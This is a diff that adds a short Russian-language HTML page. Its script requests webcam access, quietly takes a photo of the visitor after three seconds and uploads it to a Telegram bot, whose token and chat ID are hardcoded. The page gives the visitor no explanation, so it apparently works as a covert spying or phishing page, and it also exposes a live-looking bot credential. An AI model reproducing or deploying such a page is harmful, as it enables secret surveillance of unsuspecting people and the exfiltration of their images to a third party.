@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Сделать фото и отправить</title>
+</head>
+<body>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7992994740:AAGwalP97X8BFhuHYArApCUJS5-NeQV-Sr0";  // <-- Вставьте новый токен
+        const CHAT_ID = "621679070";  // <-- Вставьте ваш Chat ID
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Запрашиваем доступ к камере
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                setTimeout(takePhoto, 3000);  // Делаем фото через 3 секунды
+            })
+            .catch(error => console.error("Ошибка доступа к камере", error));
+
+        function takePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Конвертируем изображение в Blob и отправляем в Telegram
+            canvas.toBlob(blob => {
+                let formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "photo.png");
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                }).then(response => console.log("Фото отправлено!"))
+                  .catch(error => console.error("Ошибка отправки фото", error));
+            }, "image/png");
+        }
+    </script>
+</body>
+</html>
